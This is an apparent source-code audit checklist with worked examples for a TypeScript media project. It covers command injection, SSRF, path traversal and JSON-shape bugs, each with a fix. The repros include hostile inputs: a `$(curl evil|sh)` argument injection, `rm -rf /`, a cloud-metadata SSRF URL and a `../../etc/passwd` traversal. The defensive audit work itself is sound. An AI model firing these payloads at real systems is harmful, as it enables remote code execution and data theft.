# source-audit — bug-magnet checklist + worked examples

## Bug-magnet grep targets (per subsystem)
- Uncaught `throw` / bare `catch {}` (is the swallow intentional fault-isolation?)
- `fetch(` / `axios.get` with no `timeout` + no `AbortSignal`
- `Promise.all` used where `Promise.allSettled` is needed
- retry/backoff: wrong delay, infinite loop, no jitter
- dedupe / `slice` / `offset` math in failover paths
- relevance filters: `\b${tok}\b`, `includes`, compound off-topic maps
- auth headers, SSRF / `isSafeUrl` guards (image AND video branches)
- `require()` of optional offline-fallback modules; silent `null` returns
- `new URL(...)` on untrusted input (throws on malformed → unguarded)

## Worked example 1 — whole-word filter false-negative (REPRODUCED)
File: `src/lib/free-image/adapter.ts:59` (also `free-video/adapter.ts:88`, `visual-fetcher.ts:860`)
```
const re = new RegExp(`\\b${tok.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')}\\b`,'i');
if (re.test(t)) return true;
```
Probe: `FreeImageAdapter.isOnTopic('lion','Lions in the wild')` → `false` (expected `true`).
Fix: key `offTopicCompounds` on the stem, match `\b${stem}s?\b`.

## Worked example 2 — IPv4-mapped IPv6 SSRF bypass (REPRODUCED)
File: `src/lib/net-safety.ts:69-75` (numeric-IPv4 guard only matches dotted decimals)
Probe: `isSafeUrl('http://[::ffff:127.0.0.1]/x')` → `{ok:true}` (should block).
Fix: detect `[::ffff:d.d.d.d]` and ULA/link-local IPv6 before returning ok.

## Worked example 3 — image path skips SSRF guard (code-path analysis)
File: `src/lib/media-downloader.ts:215` — `fetch(hit.url,...)` with no `isSafeUrl`,
while the video path (`free-video/download/downloader.ts:147`) does check it.
Fix: guard the image branch identically.

## Display-artifact gotcha (false alarm, do NOT report)
`visual-fetcher.ts:689,774` and `pexels.ts:28` show `Authorization: ***`.
Hexdump (`od -c`) proves the real token is `key` / `pexelsApiKey`. Not a bug.
Rule: `od -c` / `cat -A` any redacted-looking literal before reporting a secret leak.

## Worked example 4 — `***` is a mask of `Bearer`, not a missing header (indirect proof)
File: `src/agentic/brain.ts:69` and `:384` show `Authorization: *** ${o.openRouterKey}`.
The SAME `*** ` mask appears in `src/lib/api-tts-provider.ts:234` (`Authorization: *** ${apiKey}`).
`grep`, `sed`, `read_file`, AND `node -e readFileSync` all print `*** ` — so it is a DISPLAY redaction layer, not the source bytes.
Disproof recipe (no python needed on Win/MSYS — `python3` is missing there): find a sibling test that hits the exact code path and asserts the real value:
```bash
grep -rn "config.headers\['Authorization'\]" src/lib/        # -> api-tts-provider.test.ts:148 expects 'Bearer test-api-key'
node --import tsx --test "src/lib/api-tts-provider.test.ts"  # -> 4/4 pass  => source really has `Bearer`
```
Because that test passes against the SAME masked source, `brain.ts:69/384` also truly contain `Bearer ${o.openRouterKey}`. Report: NONE (already-fixed / false alarm).
PITFALL: do NOT re-flag an "Authorization missing Bearer" when a passing test in the same repo already asserts the real `Bearer <val>`.

## Worked example 6 — command-injection RCE via allowlisted `exec` + `args` (REPRODUCED)
File: `src/adapters/mcp/pipeline-commands.ts:7-16` (AVG).
```ts
const ALLOWED_COMMANDS = ['generate','resume','segment','remotion:render','remotion:studio'];
export async function runPipelineCommand(command: string, args: string[] = []) {
  if (!ALLOWED_COMMANDS.includes(command)) throw new Error('not whitelisted');
  const cmd = `npm run ${command} -- ${args.join(' ')}`;   // <-- args hit a shell
  const child = exec(cmd, { cwd: resolveProjectPath() }, cb);
}
```
The allowlist only covers `command`; `args` is concatenated into a shell string. Repro:
`runPipelineCommand('generate', ['--x=$(curl evil|sh)'])` → `npm run generate -- --x=$(curl evil|sh)` runs the attacker command. The existing test `runPipelineCommand('generate; rm -rf /', ['--flag'])` only catches injection inside the *command* token (already rejected by the allowlist) — it does NOT test the `args` vector.
**Fix:** `execFile('npm', ['run', command, '--', ...args], { cwd }, cb)` or `spawn('npm', ['run', command, '--', ...args])`. Args become argv, never shell-parsed. This is the #1 critical finding in a security hunt.

## Worked example 7 — SSRF on an unauthenticated user-URL download path (code-path)
File: `src/adapters/http/api-routes.ts:114-118` → `social-download-controller.ts:16` → `social-download-app.service.ts:25` → `video-downloader-service.ts:63`.
The curated stock path guards URLs with `isSafeUrl()`, but `POST /api/social-download/process` only validates `z.string().url()` (well-formed, arbitrary host) and hands the URL straight to `spawn('python', ['-m','yt_dlp',...,url])` with NO SSRF check, and the route has no `requireLocalAccess`. Attacker: `{ url: 'http://169.254.169.254/latest/meta-data/' }` → server-side request to cloud metadata / internal services.
**Fix:** reject before spawn: `const safe = isSafeUrl(url); if (!safe.ok) throw new Error(safe.reason);`

## Worked example 8 — `..` traversal via under-constrained filename schema (REPRODUCED)
File: `src/schemas/api.schemas.ts:5` `safeFilenameSchema` regex `/^[^\\/]+$/` + `src/shared/runtime/paths.ts:58` server branch of `resolveProjectPath` (no `..`-strip).
Repro: `node -e "const re=/^[^\\/]+$/;console.log(re.test('..'), re.test('a\\\\b'))"` → `true true`. Then `inputAssetPath('../../etc/passwd')` in server mode (no electron `normalizeRelativeSegments`) resolves to `C:\etc\passwd`, escaping `input-assets`. A scene `localAsset` is API-settable, so a crafted value reads outside the asset dir.
**Fix:** schema `.refine(s => !s.includes('..'))` OR tighten regex `/^(?!\.\.?\/?$)[^\\/]+$/`; AND make `resolveProjectPath` run ALL segments (not just electron) through the `..`-throwing normalizer.

## Security audit checklist (extra grep targets)
- `exec(` / `execSync(` / `child_process` with any interpolated user/agent value vs `execFile`/`spawn` argv arrays.
- Every external-URL sink (`fetch(`, `axios`, `yt-dlp`, `curl`, ffmpeg `-i <url>`): does `isSafeUrl`/`allowlist` run on it? Grep `isSafeUrl` call sites and diff against all URL sinks.
- `z.object({...})` schema fields that become filesystem paths: are they `safeFilenameSchema`, or loose `z.string()`? Look for `resolveProjectPath('output', x)` / `path.join(root, userVal)`.
- Any `isLocalRequest` / `requireLocalAccess` gate: is there an env var that short-circuits it to `true` for all requests?
- `.env` in `.gitignore`? `git ls-files | grep -i \.env` to confirm only `.env.example` is tracked.
- `console.log` near `KEY|SECRET|TOKEN` — but FIRST `od -c`/sibling-test the line to rule out a `***` display mask (see Worked example 4).

## Worked example 5 — Ollama vision payload shape bug (code-path + sibling-test)
File: `src/agentic/brain.ts:402-405` (non-OpenRouter / local-Ollama `visionVerify` branch).
The `messages` array puts an `image_url` content-part as a bare second element with no `role`/`type`/`content` wrapper:
```ts
: [
    { role: 'user', content: `Does this image depict: ...?` },
    { type: 'image_url', image_url: { url: `data:image/jpeg;base64,${b64}` } },   // malformed
]
```
Ollama `/api/chat` requires ONE `role:'user'` message whose `content` is a parts array (`[{type:'text',...},{type:'image_url',...}]`). This structure is rejected -> `visionVerify` always returns `null` for the local-Ollama vision path (silent signal-gate fallback). Fix: mirror the OpenRouter branch (one user message, `content` = parts array). Companion bug at `brain.ts:228`: the `expandKeywords` schema hint `'{"keywords":["...","..."}'` has a `}` instead of `]` — invalid JSON, breaks the model-shape echo. Fix: `'{"keywords":["...","..."]}'`.
